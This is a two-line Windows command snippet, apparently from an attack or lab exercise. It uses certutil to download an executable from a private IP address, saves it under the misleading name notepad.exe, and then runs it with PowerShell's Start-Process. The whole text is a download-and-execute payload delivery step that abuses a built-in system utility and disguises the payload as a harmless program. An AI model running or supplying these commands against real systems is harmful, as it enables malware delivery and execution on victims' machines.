certutil -urlcache -f http://192.168.56.110/notepad.exe C:\tmp\notepad.exe
Start-Process -FilePath "C:\tmp\notepad.exe"
